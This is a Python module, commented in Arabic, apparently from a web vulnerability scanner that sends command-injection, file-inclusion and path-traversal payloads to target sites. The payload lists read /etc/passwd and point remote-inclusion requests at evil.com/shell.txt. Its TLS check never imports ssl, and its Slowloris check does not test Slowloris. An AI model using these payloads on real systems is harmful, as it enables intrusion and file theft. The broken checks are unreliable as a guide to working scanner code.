#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
وحدة فحص ثغرات الشبكة
تتضمن فحوصات لثغرات الشبكة مثل Command Injection و RCE وغيرها
"""

import socket
import subprocess
import requests
import urllib.parse
from .base_scanner import VulnerabilityScanner

class NetworkVulnerabilityScanner(VulnerabilityScanner):
    """فاحص ثغرات الشبكة"""
    
    def __init__(self, config=None):
        """تهيئة الفاحص"""
        super().__init__(config)
        
    def get_description(self):
        """الحصول على وصف الفاحص"""
        return "فاحص ثغرات الشبكة الشامل"
    
    def get_supported_vulnerabilities(self):
        """الحصول على قائمة الثغرات المدعومة"""
        return [
            'Command Injection',
            'Remote Code Execution (RCE)',
            'Local/Remote File Inclusion (LFI/RFI)',
            'Directory Traversal',
            'File Upload Vulnerabilities',
            'Unrestricted File Upload',
            'DNS Spoofing / DNS Hijacking',
            'DNS Tunneling',
            'Man-in-the-Middle (MITM)',
            'TLS/SSL Attacks',
            'Evil Twin Attack',
            'Bluetooth Attacks',
            'NFC Attacks',
            'RFID Attacks',
            'Denial of Service (DoS/DDoS)'
        ]
    
    def scan(self, target, progress=None):
        """فحص الهدف للثغرات"""
        vulnerabilities = []
        
        # الحصول على عنوان URL للهدف
        if target.get_hostname():
            base_url = f"http://{target.get_hostname()}"
            if 443 in target.get_ports() and target.get_ports()[443] == 'open':
                base_url = f"https://{target.get_hostname()}"
        else:
            base_url = f"http://{target.get_ip()}"
            if 443 in target.get_ports() and target.get_ports()[443] == 'open':
                base_url = f"https://{target.get_ip()}"
        
        # فحص ثغرات الشبكة
        try:
            # فحص Command Injection
            cmd_inj_vulns = self._check_command_injection(base_url)
            vulnerabilities.extend(cmd_inj_vulns)
            
            # فحص Local File Inclusion
            lfi_vulns = self._check_lfi(base_url)
            vulnerabilities.extend(lfi_vulns)
            
            # فحص Remote File Inclusion
            rfi_vulns = self._check_rfi(base_url)
            vulnerabilities.extend(rfi_vulns)
            
            # فحص Directory Traversal
            dt_vulns = self._check_directory_traversal(base_url)
            vulnerabilities.extend(dt_vulns)
            
            # فحص ثغرات SSL/TLS
            ssl_vulns = self._check_ssl_vulnerabilities(target)
            vulnerabilities.extend(ssl_vulns)
            
            # فحص DoS/DDoS
            dos_vulns = self._check_dos_vulnerabilities(target)
            vulnerabilities.extend(dos_vulns)
            
        except Exception as e:
            if self.verbose:
                print(f"خطأ في فحص ثغرات الشبكة: {str(e)}")
        
        # إضافة الثغرات إلى الهدف
        for vuln in vulnerabilities:
            target.add_vulnerability(vuln)
        
        return vulnerabilities
    
    def _make_request(self, url, method='GET', data=None, params=None, follow_redirects=True):
        """إجراء طلب HTTP"""
        try:
            headers = {
                'User-Agent': 'UltimateScan/1.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            if method.upper() == 'GET':
                response = requests.get(
                    url,
                    params=params,
                    headers=headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=follow_redirects
                )
            elif method.upper() == 'POST':
                response = requests.post(
                    url,
                    data=data,
                    headers=headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=follow_redirects
                )
            else:
                return None
            
            return response
        except Exception as e:
            if self.verbose:
                print(f"خطأ في إجراء طلب HTTP: {str(e)}")
            return None
    
    def _check_command_injection(self, base_url):
        """فحص ثغرة Command Injection"""
        vulnerabilities = []
        
        # قائمة بالمسارات المحتملة
        paths = [
            '/ping.php', '/ping', '/cmd.php', '/exec.php', '/command.php',
            '/shell.php', '/system.php', '/exec', '/command', '/system',
            '/tools/ping.php', '/admin/ping.php', '/admin/tools/ping.php'
        ]
        
        # قائمة بالمعلمات المحتملة
        params = ['ip', 'host', 'cmd', 'command', 'exec', 'query', 'q', 'system', 'run']
        
        # قائمة بحمولات Command Injection
        payloads = [
            ';id', '|id', '`id`', '$(id)', '& id', '&& id',
            ';ls -la', '|ls -la', '`ls -la`', '$(ls -la)', '& ls -la', '&& ls -la',
            ';cat /etc/passwd', '|cat /etc/passwd', '`cat /etc/passwd`', '$(cat /etc/passwd)', '& cat /etc/passwd', '&& cat /etc/passwd'
        ]
        
        # قائمة بأنماط الاستجابة التي تشير إلى نجاح الحقن
        patterns = [
            'uid=', 'gid=', 'groups=', 'root:', 'bin:', 'daemon:', 'total ',
            'drwx', '-rwx', '-rw-', 'usr', 'etc', 'var'
        ]
        
        # فحص كل مسار
        for path in paths:
            url = f"{base_url}{path}"
            
            # فحص كل معلمة
            for param in params:
                for payload in payloads:
                    # إنشاء معلمات الطلب
                    params_data = {param: f"127.0.0.1{payload}"}
                    
                    # إرسال الطلب
                    response = self._make_request(url, params=params_data)
                    
                    if response:
                        # التحقق من وجود أنماط الاستجابة
                        for pattern in patterns:
                            if pattern in response.text:
                                vuln = self.create_vulnerability(
                                    vuln_type='Command Injection',
                                    severity='critical',
                                    description='الموقع معرض لثغرة حقن الأوامر',
                                    location={
                                        'url': url,
                                        'parameter': param
                                    },
                                    exploit_info={
                                        'payload': payload,
                                        'exploit_url': f"{url}?{param}=127.0.0.1{urllib.parse.quote(payload)}",
                                        'method': 'GET'
                                    },
                                    recommendation='تنقية مدخلات المستخدم وتجنب تنفيذ أوامر النظام مباشرة',
                                    references=[
                                        'https://owasp.org/www-community/attacks/Command_Injection',
                                        'https://portswigger.net/web-security/os-command-injection'
                                    ]
                                )
                                vulnerabilities.append(vuln)
                                break
        
        return vulnerabilities
    
    def _check_lfi(self, base_url):
        """فحص ثغرة Local File Inclusion"""
        vulnerabilities = []
        
        # قائمة بالمسارات المحتملة
        paths = [
            '/index.php', '/page.php', '/main.php', '/file.php', '/include.php',
            '/view.php', '/content.php', '/display.php', '/show.php', '/load.php',
            '/read.php', '/inc.php', '/include/index.php', '/pages/index.php'
        ]
        
        # قائمة بالمعلمات المحتملة
        params = ['page', 'file', 'include', 'doc', 'path', 'content', 'template', 'module', 'view', 'load']
        
        # قائمة بحمولات LFI
        payloads = [
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '../../../../../../../etc/passwd%00',
            '../../../../../../../../etc/passwd%00',
            '/etc/passwd',
            'file:///etc/passwd',
            'php://filter/convert.base64-encode/resource=/etc/passwd'
        ]
        
        # قائمة بأنماط الاستجابة التي تشير إلى نجاح الحقن
        patterns = [
            'root:', 'bin:', 'daemon:', 'nobody:', 'www-data:'
        ]
        
        # فحص كل مسار
        for path in paths:
            url = f"{base_url}{path}"
            
            # فحص كل معلمة
            for param in params:
                for payload in payloads:
                    # إنشاء معلمات الطلب
                    params_data = {param: payload}
                    
                    # إرسال الطلب
                    response = self._make_request(url, params=params_data)
                    
                    if response:
                        # التحقق من وجود أنماط الاستجابة
                        for pattern in patterns:
                            if pattern in response.text:
                                vuln = self.create_vulnerability(
                                    vuln_type='Local File Inclusion (LFI)',
                                    severity='high',
                                    description='الموقع معرض لثغرة تضمين الملفات المحلية',
                                    location={
                                        'url': url,
                                        'parameter': param
                                    },
                                    exploit_info={
                                        'payload': payload,
                                        'exploit_url': f"{url}?{param}={urllib.parse.quote(payload)}",
                                        'method': 'GET'
                                    },
                                    recommendation='تنقية مدخلات المستخدم وتجنب استخدام مدخلات المستخدم في مسارات الملفات',
                                    references=[
                                        'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion',
                                        'https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/'
                                    ]
                                )
                                vulnerabilities.append(vuln)
                                break
        
        return vulnerabilities
    
    def _check_rfi(self, base_url):
        """فحص ثغرة Remote File Inclusion"""
        vulnerabilities = []
        
        # قائمة بالمسارات المحتملة
        paths = [
            '/index.php', '/page.php', '/main.php', '/file.php', '/include.php',
            '/view.php', '/content.php', '/display.php', '/show.php', '/load.php',
            '/read.php', '/inc.php', '/include/index.php', '/pages/index.php'
        ]
        
        # قائمة بالمعلمات المحتملة
        params = ['page', 'file', 'include', 'doc', 'path', 'content', 'template', 'module', 'view', 'load']
        
        # قائمة بحمولات RFI
        payloads = [
            'http://evil.com/shell.txt',
            'https://evil.com/shell.txt',
            'http://evil.com/shell.txt?',
            'http://evil.com/shell.txt%00'
        ]
        
        # فحص كل مسار
        for path in paths:
            url = f"{base_url}{path}"
            
            # فحص كل معلمة
            for param in params:
                for payload in payloads:
                    # إنشاء معلمات الطلب
                    params_data = {param: payload}
                    
                    # إرسال الطلب
                    response = self._make_request(url, params=params_data)
                    
                    if response:
                        # التحقق من وجود أنماط الاستجابة
                        if 'allow_url_include' in response.text or 'allow_url_fopen' in response.text:
                            vuln = self.create_vulnerability(
                                vuln_type='Remote File Inclusion (RFI)',
                                severity='critical',
                                description='الموقع معرض لثغرة تضمين الملفات البعيدة',
                                location={
                                    'url': url,
                                    'parameter': param
                                },
                                exploit_info={
                                    'payload': payload,
                                    'exploit_url': f"{url}?{param}={urllib.parse.quote(payload)}",
                                    'method': 'GET'
                                },
                                recommendation='تنقية مدخلات المستخدم وتعطيل allow_url_include و allow_url_fopen في إعدادات PHP',
                                references=[
                                    'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion',
                                    'https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/'
                                ]
                            )
                            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _check_directory_traversal(self, base_url):
        """فحص ثغرة Directory Traversal"""
        vulnerabilities = []
        
        # قائمة بالمسارات المحتملة
        paths = [
            '/index.php', '/page.php', '/download.php', '/file.php', '/view.php',
            '/read.php', '/get.php', '/show.php', '/display.php', '/fetch.php',
            '/download', '/file', '/view', '/read', '/get', '/show', '/display', '/fetch'
        ]
        
        # قائمة بالمعلمات المحتملة
        params = ['file', 'path', 'dir', 'folder', 'doc', 'document', 'img', 'image', 'download', 'read']
        
        # قائمة بحمولات Directory Traversal
        payloads = [
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '../../../../../../../etc/passwd%00',
            '../../../../../../../../etc/passwd%00',
            '../../../../../../../windows/win.ini',
            '../../../../../../../../windows/win.ini',
            '../../../../../../../windows/win.ini%00',
            '../../../../../../../../windows/win.ini%00'
        ]
        
        # قائمة بأنماط الاستجابة التي تشير إلى نجاح الحقن
        patterns = [
            'root:', 'bin:', 'daemon:', 'nobody:', 'www-data:',
            '[fonts]', '[extensions]', '[files]', '[mci extensions]'
        ]
        
        # فحص كل مسار
        for path in paths:
            url = f"{base_url}{path}"
            
            # فحص كل معلمة
            for param in params:
                for payload in payloads:
                    # إنشاء معلمات الطلب
                    params_data = {param: payload}
                    
                    # إرسال الطلب
                    response = self._make_request(url, params=params_data)
                    
                    if response:
                        # التحقق من وجود أنماط الاستجابة
                        for pattern in patterns:
                            if pattern in response.text:
                                vuln = self.create_vulnerability(
                                    vuln_type='Directory Traversal',
                                    severity='high',
                                    description='الموقع معرض لثغرة تجاوز المسارات',
                                    location={
                                        'url': url,
                                        'parameter': param
                                    },
                                    exploit_info={
                                        'payload': payload,
                                        'exploit_url': f"{url}?{param}={urllib.parse.quote(payload)}",
                                        'method': 'GET'
                                    },
                                    recommendation='تنقية مدخلات المستخدم وتجنب استخدام مدخلات المستخدم في مسارات الملفات',
                                    references=[
                                        'https://owasp.org/www-community/attacks/Path_Traversal',
                                        'https://portswigger.net/web-security/file-path-traversal'
                                    ]
                                )
                                vulnerabilities.append(vuln)
                                break
        
        return vulnerabilities
    
    def _check_ssl_vulnerabilities(self, target):
        """فحص ثغرات SSL/TLS"""
        vulnerabilities = []
        
        # التحقق من وجود منفذ HTTPS
        if 443 not in target.get_ports() or target.get_ports()[443] != 'open':
            return vulnerabilities
        
        # الحصول على عنوان الهدف
        host = target.get_hostname() or target.get_ip()
        
        try:
            # فحص بروتوكولات SSL/TLS القديمة
            context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((host, 443), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    version = ssock.version()
                    
                    if 'SSLv2' in version or 'SSLv3' in version or 'TLSv1.0' in version or 'TLSv1.1' in version:
                        vuln = self.create_vulnerability(
                            vuln_type='Outdated SSL/TLS Protocol',
                            severity='high',
                            description=f'الخادم يستخدم بروتوكول SSL/TLS قديم: {version}',
                            location={
                                'host': host,
                                'port': 443
                            },
                            recommendation='تعطيل بروتوكولات SSL/TLS القديمة وتفعيل TLSv1.2 أو أحدث فقط',
                            references=[
                                'https://www.acunetix.com/vulnerabilities/web/outdated-ssl-protocol/',
                                'https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet'
                            ]
                        )
                        vulnerabilities.append(vuln)
        except:
            pass
        
        return vulnerabilities
    
    def _check_dos_vulnerabilities(self, target):
        """فحص ثغرات DoS/DDoS"""
        vulnerabilities = []
        
        # الحصول على عنوان الهدف
        host = target.get_hostname() or target.get_ip()
        
        # فحص منافذ الويب
        web_ports = []
        for port, state in target.get_ports().items():
            if state == 'open' and port in [80, 443, 8080, 8443]:
                web_ports.append(port)
        
        if not web_ports:
            return vulnerabilities
        
        # فحص ثغرة Slowloris
        for port in web_ports:
            protocol = 'https' if port in [443, 8443] else 'http'
            url = f"{protocol}://{host}:{port}"
            
            try:
                # إرسال طلب HTTP مع رؤوس كثيرة
                headers = {'User-Agent': 'UltimateScan/1.0'}
                for i in range(50):
                    headers[f'X-Test-{i}'] = 'A' * 1000
                
                response = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
                
                # إذا نجح الطلب، فقد يكون الخادم معرضاً لهجمات Slowloris
                if response.status_code < 500:
                    vuln = self.create_vulnerability(
                        vuln_type='Potential DoS Vulnerability (Slowloris)',
                        severity='medium',
                        description='الخادم قد يكون معرضاً لهجمات Slowloris DoS',
                        location={
                            'host': host,
                            'port': port
                        },
                        recommendation='تكوين الخادم للحد من عدد الاتصالات المتزامنة وتعيين مهلة للاتصالات غير المكتملة',
                        references=[
                            'https://www.cloudflare.com/learning/ddos/ddos-attack-tools/slowloris/',
                            'https://owasp.org/www-community/attacks/Denial_of_Service'
                        ]
                    )
                    vulnerabilities.append(vuln)
            except:
                pass
        
        return vulnerabilities
